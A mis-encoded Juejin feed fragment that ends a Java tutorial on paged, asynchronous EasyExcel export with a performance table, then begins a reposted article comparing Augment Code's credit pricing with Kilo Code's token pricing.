<p>â€œ</p>
<p>ç™¾ä¸‡è¡Œå¯¼å‡ºéœ€è¦å‡ åç§’ï¼Ÿåˆ«è®©ç”¨æˆ·å‚»ç­‰ï¼</p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. å¼‚æ­¥å¯¼å‡ºæ¥å£</span>
<span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/export/async"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ResultVo</span>&lt;<span class="hljs-title class_">String</span>&gt;Â <span class="hljs-title function_">triggerAsyncExport</span>(<span class="hljs-params"/>) {
Â  Â  <span class="hljs-title class_">String</span> taskId =Â <span class="hljs-string">"EXPORT_"</span>Â + <span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>(); <span class="hljs-comment">// ç”Ÿæˆå”¯ä¸€ä»»åŠ¡ID</span>
Â  Â  <span class="hljs-comment">// ğŸš€ æäº¤å¼‚æ­¥ä»»åŠ¡ (ä½¿ç”¨çº¿ç¨‹æ± )</span>
Â  Â  asyncTaskExecutor.<span class="hljs-title function_">execute</span>(() -&gt; <span class="hljs-title function_">doExportTask</span>(taskId));
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title class_">ResultVo</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"å¯¼å‡ºä»»åŠ¡å·²æäº¤ï¼Œè¯·ç¨åæŸ¥è¯¢è¿›åº¦"</span>, taskId);
}

<span class="hljs-comment">// 2. å®é™…å¯¼å‡ºä»»åŠ¡</span>
<span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">doExportTask</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> taskId</span>) {
Â  Â  <span class="hljs-keyword">try</span> {
Â  Â  Â  Â  <span class="hljs-comment">// 2.1 ä¿å­˜ä»»åŠ¡çŠ¶æ€ (è¿›è¡Œä¸­/0%)</span>
Â  Â  Â  Â  exportTaskService.<span class="hljs-title function_">save</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ExportTask</span>(taskId,Â <span class="hljs-string">"PROCESSING"</span>, <span class="hljs-number">0</span>));

Â  Â  Â  Â  <span class="hljs-comment">// 2.2 æ‰§è¡Œåˆ†é¡µå¯¼å‡º (ä½¿ç”¨æˆ‘ä»¬çš„ExcelExporter)</span>
Â  Â  Â  Â  int total = userService.<span class="hljs-title function_">countTotalUsers</span>();
Â  Â  Â  Â  <span class="hljs-title class_">AtomicInteger</span> exported = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// å·²å¯¼å‡ºè®¡æ•°å™¨</span>

Â  Â  Â  Â  <span class="hljs-title class_">ExcelExporter</span>.<span class="hljs-title function_">exportByPage</span>(
Â  Â  Â  Â  Â  Â  Â  Â  ..., <span class="hljs-comment">// response éœ€è¦ç‰¹æ®Šå¤„ç† (å†™æ–‡ä»¶)</span>
Â  Â  Â  Â  Â  Â  Â  Â  ...,
Â  Â  Â  Â  Â  Â  Â  Â  (pageNum, pageSize) -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; page = userService.<span class="hljs-title function_">findByPage</span>(pageNum, pageSize);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ¯ æ›´æ–°è¿›åº¦</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  int currentExported = exported.<span class="hljs-title function_">addAndGet</span>(page.<span class="hljs-title function_">size</span>());
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  int progress = (int) ((currentExported / (double) total) * <span class="hljs-number">100</span>);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  exportTaskService.<span class="hljs-title function_">updateProgress</span>(taskId, progress);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â page;
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  );

Â  Â  Â  Â  <span class="hljs-comment">// 2.3 ä»»åŠ¡å®Œæˆ (100%)</span>
Â  Â  Â  Â  exportTaskService.<span class="hljs-title function_">updateStatus</span>(taskId,Â <span class="hljs-string">"SUCCESS"</span>, <span class="hljs-number">100</span>, filePath); <span class="hljs-comment">// å­˜å‚¨æ–‡ä»¶è·¯å¾„</span>
Â  Â  } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
Â  Â  Â  Â  <span class="hljs-comment">// 2.4 ä»»åŠ¡å¤±è´¥</span>
Â  Â  Â  Â  exportTaskService.<span class="hljs-title function_">updateStatus</span>(taskId,Â <span class="hljs-string">"FAILED"</span>, <span class="hljs-number">0</span>, e.<span class="hljs-title function_">getMessage</span>());
Â  Â  }
}

<span class="hljs-comment">// 3. è¿›åº¦æŸ¥è¯¢æ¥å£</span>
<span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/export/progress/{taskId}"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ResultVo</span>&lt;<span class="hljs-title class_">ExportProgress</span>&gt; <span class="hljs-title function_">getExportProgress</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">String</span> taskId</span>) {
Â  Â  <span class="hljs-title class_">ExportProgress</span> progress = exportTaskService.<span class="hljs-title function_">getProgress</span>(taskId);
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title class_">ResultVo</span>.<span class="hljs-title function_">success</span>(progress);
}

<span class="hljs-comment">// 4. æ–‡ä»¶ä¸‹è½½æ¥å£ (ä»»åŠ¡æˆåŠŸå)</span>
<span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/export/download/{taskId}"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">downloadExportFile</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">String</span> taskId, HttpServletResponse response</span>) {
Â  Â  <span class="hljs-title class_">String</span> filePath = exportTaskService.<span class="hljs-title function_">getFilePath</span>(taskId);
Â  Â  <span class="hljs-comment">// ... å®ç°æ–‡ä»¶ä¸‹è½½é€»è¾‘ ...</span>
}
</code></pre>
<h5 data-id="heading-12"><strong>æŠ€å·§ 3ï¼šå¤š Sheet å¯¼å‡º</strong></h5>
<pre><code class="hljs language-ini" lang="ini">try (ExcelWriter <span class="hljs-attr">excelWriter</span> = EasyExcel.write(outputStream).build()) {
Â  Â  List&lt;String&gt; <span class="hljs-attr">sheetNames</span> = Arrays.asList(<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯"</span>,Â <span class="hljs-string">"è®¢å•è®°å½•"</span>,Â <span class="hljs-string">"æ“ä½œæ—¥å¿—"</span>)<span class="hljs-comment">;</span>
Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; sheetNames.size(); i++) {</span>
Â  Â  Â  Â  WriteSheet <span class="hljs-attr">sheet</span> = EasyExcel.writerSheet(i, sheetNames.get(i)).head(User.class).build()<span class="hljs-comment">; // æ ¹æ®Sheetè®¾ç½®ä¸åŒhead</span>
Â  Â  Â  Â  // å¯¹è¯¥Sheetè¿›è¡Œåˆ†é¡µå†™å…¥ (å¤ç”¨å‰é¢çš„åˆ†é¡µé€»è¾‘)...
Â  Â  Â  Â  PageWriteExcelHelper.writeForSheet(excelWriter, sheet, ...)<span class="hljs-comment">;</span>
Â  Â  }
} // try-with-resourcesè‡ªåŠ¨å…³é—­excelWriter
</code></pre>
<h5 data-id="heading-13"><strong>æŠ€å·§ 4ï¼šå¤æ‚æ ·å¼ï¼Ÿæ¨¡æ¿å¯¼å‡ºï¼</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. æå‰å‡†å¤‡å¥½å¸¦æ ·å¼çš„ template.xlsx æ”¾åœ¨èµ„æºç›®å½•</span>
<span class="hljs-comment">// 2. æ¨¡æ¿å¯¼å‡ºä»£ç </span>
<span class="hljs-type">String</span> <span class="hljs-variable">templateFile</span> <span class="hljs-operator">=</span>Â <span class="hljs-string">"/templates/complex-report-template.xlsx"</span>;
<span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">templateStream</span> <span class="hljs-operator">=</span> getClass().getResourceAsStream(templateFile);
Â  Â  Â <span class="hljs-type">ExcelWriter</span> <span class="hljs-variable">excelWriter</span> <span class="hljs-operator">=</span> EasyExcel.write(response.getOutputStream())
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .withTemplate(templateStream)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .build()) {

Â  Â  <span class="hljs-type">WriteSheet</span> <span class="hljs-variable">writeSheet</span> <span class="hljs-operator">=</span> EasyExcel.writerSheet().build();
Â  Â  <span class="hljs-comment">// å¡«å……å•ä¸ªæ•°æ®</span>
Â  Â  excelWriter.fill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateData</span>(...), writeSheet);
Â  Â  <span class="hljs-comment">// å¡«å……åˆ—è¡¨æ•°æ® (æ”¯æŒåˆ†é¡µå¡«å……!)</span>
Â  Â  excelWriter.fill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FillWrapper</span>(<span class="hljs-string">"dataList"</span>, pageData), writeSheet); <span class="hljs-comment">//Â 'dataList'Â æ˜¯æ¨¡æ¿é‡Œçš„å˜é‡å</span>
Â  Â  <span class="hljs-comment">// ... å¡«å……æ›´å¤šæ•°æ® ...</span>
}
</code></pre>
<h3 data-id="heading-14"><strong>å…­ã€æ€§èƒ½å®æµ‹ï¼šåˆ†é¡µæ¨¡å¼ vs æ™®é€šæ¨¡å¼</strong></h3>
<p><strong>æµ‹è¯•ç¯å¢ƒï¼š</strong> Â JDK 17 | 4æ ¸ CPU | 4GB å†…å­˜ | MySQL 8.0</p>








































<table><thead><tr><th>æ•°æ®é‡</th><th>æ™®é€šæ¨¡å¼</th><th>åˆ†é¡µæ¨¡å¼ (2000è¡Œ/æ‰¹)</th><th>å†…å­˜å³°å€¼å¯¹æ¯”</th><th>ç»“æœ</th></tr></thead><tbody><tr><td><strong>5åƒè¡Œ</strong></td><td>~350ms</td><td>~400ms</td><td>32MB<strong>vs</strong>28MB</td><td>å·®å¼‚ä¸å¤§</td></tr><tr><td><strong>5ä¸‡è¡Œ</strong></td><td>âš ï¸ ~2.5s (OOMé£é™©)</td><td>~2.3s</td><td>210MB<strong>vs</strong>48MB</td><td>**å†…å­˜é™ä½77%!**âœ…</td></tr><tr><td><strong>50ä¸‡è¡Œ</strong></td><td>âŒ OOM (å¤±è´¥)</td><td>~10.8s</td><td>-<strong>vs</strong>52MB</td><td>æ™®é€šæ¨¡å¼å®Œå…¨å´©æ‰</td></tr><tr><td><strong>500ä¸‡è¡Œ</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>~82s</td><td>-<strong>vs</strong>55MB</td><td><strong>ç¨³å®šè¾“å‡ºï¼Œçº¦6.1ä¸‡è¡Œ/ç§’</strong>âœ…</td></tr></tbody></table>
<blockquote>
<p>â€œ</p>
<p><strong>ç»“è®ºè‚‰çœ¼å¯è§ï¼š</strong> Â åˆ†é¡µæ¨¡å¼åœ¨å¤§æ•°æ®é‡ä¸‹å†…å­˜å ç”¨æå…¶ç¨³å®šï¼Œä¸”å®Œå…¨è§„é¿äº† OOM é£é™©ï¼</p>
</blockquote>
<h3 data-id="heading-15"><strong>ä¸ƒã€é¿å‘æŒ‡å— &amp; æœ€ä½³å®è·µ</strong></h3>
<ul>
<li><strong>åˆ†é¡µå¤§å°ä¸æ˜¯è¶Šå¤§è¶Šå¥½ï¼š</strong> Â å¹³è¡¡æŸ¥è¯¢æ¬¡æ•°å’Œå†…å­˜å‹åŠ›ï¼Œ1000-5000 æ˜¯ç»éªŒå€¼ï¼Œæˆ–ç”¨åŠ¨æ€è®¡ç®—ã€‚</li>
<li><strong>åŠ¡å¿…å…³é—­ ExcelWriterï¼š</strong> <code>excelWriter.finish()</code>Â å¿…é¡»æ”¾åœ¨ finally å—ï¼å¦åˆ™èµ„æºæ³„æ¼ï¼</li>
<li><strong>åŠæ—¶æ¸…é™¤åˆ†é¡µæ•°æ®ï¼š</strong> <code>pageData.clear()</code>Â æ˜¯é‡Šæ”¾å†…å­˜çš„å…³é”®ä¸€æ­¥ï¼</li>
<li><strong>æ•°æ®åº“åˆ†é¡µä¼˜åŒ–ï¼š</strong> Â ç¡®ä¿ä½ çš„åˆ†é¡µæŸ¥è¯¢ (<code>getPage</code>) é«˜æ•ˆ (ä½¿ç”¨ç´¢å¼•ï¼Œé¿å…Â <code>offset</code>Â è¿‡å¤§)ã€‚</li>
<li><strong>ç›‘æ§ä¸æ—¥å¿—ï¼š</strong> Â è®°å½•å¯¼å‡ºä»»åŠ¡è€—æ—¶ã€å†…å­˜å˜åŒ–ã€è¡Œæ•°ï¼Œæ–¹ä¾¿æ€§èƒ½åˆ†æå’Œè°ƒä¼˜ã€‚</li>
<li><strong>å¼‚æ­¥+è¿›åº¦æ˜¯å¤§æ•°æ®æ ‡é…ï¼š</strong> Â è¶…è¿‡ 30 ç§’çš„æ“ä½œï¼Œä¸€å®šè¦è€ƒè™‘å¼‚æ­¥å’Œè¿›åº¦æç¤ºã€‚</li>
<li><strong>å·¥å…·ç±»æ˜¯ä½ çš„æœ‹å‹ï¼š</strong> Â å°è£…é€šç”¨é€»è¾‘ (<code>ExcelExporter</code>)ï¼Œå‡å°‘é‡å¤ä»£ç ï¼Œé™ä½å‡ºé”™ç‡ã€‚</li>
</ul>
<h3 data-id="heading-16"><strong>æ€»ç»“</strong></h3>
<p>EasyExcel çš„åˆ†é¡µå†™å…¥æœºåˆ¶ï¼Œæ˜¯å¾æœæµ·é‡ Excel å¯¼å‡ºçš„åˆ©å™¨ã€‚é€šè¿‡æœ¬æ–‡ï¼Œä½ æŒæ¡äº†ï¼š</p>
<ul>
<li><strong>æ ¸å¿ƒåŸç†ï¼š</strong> Â åˆ†é¡µæŸ¥è¯¢ + åˆ†æ‰¹å†™å…¥ + å³æ—¶é‡Šæ”¾</li>
<li><strong>æ ¸å¿ƒæ­¦å™¨ï¼š</strong> <code>PageWriteExcelHelper</code>Â åˆ†é¡µå†™å…¥å·¥å…·ç±»</li>
<li><strong>ç»ˆææ–¹æ¡ˆï¼š</strong> <code>ExcelExporter</code>Â å¼€ç®±å³ç”¨å¢å¼ºå·¥å…·ç±»</li>
<li><strong>è¿›é˜¶æŠ€å·§ï¼š</strong> Â åŠ¨æ€åˆ†é¡µã€å¼‚æ­¥å¯¼å‡ºã€æ¨¡æ¿æ ·å¼</li>
<li><strong>é¿å‘ç»éªŒï¼š</strong> Â å…³é—­Writerã€æ¸…ç©ºæ•°æ®ã€åˆ†é¡µä¼˜åŒ–</li>
</ul>
<p>å·¥å…·ç±»ä»£ç å·²æ‰“åŒ…ï¼Œç›´æ¥å¤åˆ¶åˆ°ä½ çš„é¡¹ç›®å°±èƒ½è·‘ï¼</p>
<p>ä½ åœ¨å¯¼å‡ºç™¾ä¸‡æ•°æ®æ—¶è¿˜é‡åˆ°è¿‡å“ªäº›å‘ï¼Ÿæˆ–è€…æœ‰ä»€ä¹ˆç‹¬é—¨ä¼˜åŒ–æŠ€å·§ï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€è½¬è½½ã€‘ç”¨ 4 ä¸ªçœŸå®ä»»åŠ¡æµ‹è¯• Augment Code çš„æ–° Credit ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7590011643297300518</link>    <guid>https://juejin.cn/post/7590011643297300518</guid>    <pubDate>2026-01-02T13:56:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643297300518" data-draft-id="7589897523269566474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€è½¬è½½ã€‘ç”¨ 4 ä¸ªçœŸå®ä»»åŠ¡æµ‹è¯• Augment Code çš„æ–° Credit ç³»ç»Ÿ"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-02T13:56:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜¯é­”ä¸¸å•Š"/> <meta itemprop="url" content="https://juejin.cn/user/3217622495411292"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€è½¬è½½ã€‘ç”¨ 4 ä¸ªçœŸå®ä»»åŠ¡æµ‹è¯• Augment Code çš„æ–° Credit ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3217622495411292/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜¯é­”ä¸¸å•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T13:56:13.000Z" title="Fri Jan 02 2026 13:56:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.kilo.ai%2Fp%2Ftesting-augment-codes-new-credit%3Frdt_cid%3D5063501567576187040%26utm_campaign%3Dwod_rt_1%26utm_medium%3Dcpc%26utm_source%3Dreddit" target="_blank" title="https://blog.kilo.ai/p/testing-augment-codes-new-credit?rdt_cid=5063501567576187040&amp;utm_campaign=wod_rt_1&amp;utm_medium=cpc&amp;utm_source=reddit" ref="nofollow noopener noreferrer">è½¬è½½</a></p>
<p><strong>åŸºäº token çš„å®šä»·æ˜¯å¦æ­£åœ¨å˜å¾—æ¯”åŸºäº credit çš„å®šä»·æ›´ç»æµï¼Ÿ</strong></p>
<p><strong>ä½œè€…ï¼š</strong> Darko
<strong>å‘å¸ƒæ—¶é—´ï¼š</strong> 2025å¹´11æœˆ10æ—¥</p>
<p>Augment Code åœ¨ 2025 å¹´ 10 æœˆä»åŸºäºæ¶ˆæ¯æ•°é‡çš„å®šä»·è½¬å‘åŸºäº credit çš„å®šä»·ã€‚ç°åœ¨ä½ å¯ä»¥è´­ä¹°æ¯æœˆçš„ "credits" é¢åº¦,è¿™äº›é¢åº¦ä¼šåœ¨æœˆæœ«è¿‡æœŸã€‚</p>
<p><strong>é—®é¢˜æ‰€åœ¨ï¼š</strong> è¿™æ˜¯åˆä¸€ä¸ªå…¬å¸æä¾›è‡ªå·±ç‰ˆæœ¬çš„ "credits" çš„æ¡ˆä¾‹,æ²¡æœ‰æ¸…æ™°è¯´æ˜è¿™èƒ½è¦†ç›–å¤šå°‘ä»»åŠ¡,æˆ–è€… credits å¦‚ä½•è½¬æ¢ä¸ºå®é™…çš„ token ä½¿ç”¨é‡ã€‚</p>
<p>è¿™å¯èƒ½æ˜¯ä»¶å¥½äº‹(ç›¸æ¯”åŸºäº token çš„å®šä»·ä½ è·å¾—æ›´å¤š),ä¹Ÿå¯èƒ½æ˜¯ä»¶åäº‹(ç›¸æ¯”åŸºäº token çš„å®šä»·ä½ è·å¾—æ›´å°‘)ã€‚Augment å±äºå‰è€…è¿˜æ˜¯åè€…ï¼Ÿè®©æˆ‘ä»¬ä¸€æ¢ç©¶ç«Ÿã€‚</p>
<p><strong>å®éªŒï¼š</strong> æˆ‘ä»¬æ³¨å†Œå¹¶é€šè¿‡ Augment å¹³å°å’Œ Kilo Code è¿è¡Œäº†å››ä¸ªæ ‡å‡†å¼€å‘ä»»åŠ¡,æ¥æ¯”è¾ƒæˆæœ¬(Augment çš„ credit vs. Kilo çš„åŸºäº token çš„å®šä»·),å¹¶äº†è§£è¿™ä¸ªæ–°çš„åŸºäº credit çš„å®šä»·ç³»ç»Ÿå¯¹ä½ æ—¥å¸¸ç¼–ç å·¥ä½œæµçš„æ„ä¹‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/575299fa534a4e488ed7dacd770859e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=c6Tx%2B049zl4DBtuvOz4bawyr06Q%3D" alt="Augment Code çš„åŸºäº credit çš„å®šä»·é¡µé¢" loading="lazy"/></p>
<h2 data-id="heading-0">æµ‹è¯•æ–¹æ³•</h2>
<p>æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª Node.jsã€TypeScript å’Œ Express é¡¹ç›®,åŒ…å«ä¸€ä¸ªç®€å•çš„ä»»åŠ¡ç®¡ç† API,å¹¶åœ¨ Augment Code å’Œ Kilo Code ä¸­ä½¿ç”¨ç›¸åŒçš„åŸºç¡€é¡¹ç›®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/779950f6a2c7494a98a637f19d755efc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=QLnqPNwRofT3iobHGq87g2K2kV8%3D" alt="é¡¹ç›®ç»“æ„" loading="lazy"/></p>
<p>ç„¶åæˆ‘ä»¬é€šè¿‡ä¸¤ä¸ªå¹³å°è¿è¡Œäº†å››ä¸ªå¸¸è§çš„å¼€å‘ä»»åŠ¡ï¼šæ·»åŠ éªŒè¯ã€é‡æ„ä»£ç ã€å®ç°åŠŸèƒ½å’Œç¼–å†™æµ‹è¯•ã€‚</p>
<p><strong>ä½¿ç”¨çš„æ¨¡å‹ï¼š</strong> æ‰€æœ‰ Augment Code æµ‹è¯•éƒ½ä½¿ç”¨ Claude Sonnet 4.5,è¿™æ˜¯ä»–ä»¬æ¨èç”¨äºç¼–ç ä»»åŠ¡çš„æ¨¡å‹ã€‚å¯¹äº Kilo Code,æˆ‘ä»¬æµ‹è¯•äº† Claude Sonnet 4.5(ç”¨äºç›´æ¥æ¯”è¾ƒ)å’Œ GLM 4.6(ç”¨äºå±•ç¤ºä½¿ç”¨é¢„ç®—æ¨¡å‹çš„æˆæœ¬èŠ‚çœ)ã€‚æˆ‘ä»¬åœ¨æµ‹è¯•æœŸé—´ä½¿ç”¨å®Œå…¨ç›¸åŒçš„ prompts,å¹¶è·Ÿè¸ªäº† credit/token æ¶ˆè€—å’Œæˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2f17996b96f4a70876a60137b3ba992~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=gEMt0fiSnDV6TVUTSgxULnQ%2BSec%3D" alt="è¿è¡Œå®Œæ‰€æœ‰å››ä¸ªä»»åŠ¡åçš„ Kilo Code" loading="lazy"/></p>
<h2 data-id="heading-1">æˆæœ¬æ˜ç»†</h2>
<h3 data-id="heading-2">ä»»åŠ¡ #1ï¼šæ·»åŠ éªŒè¯ Middleware</h3>
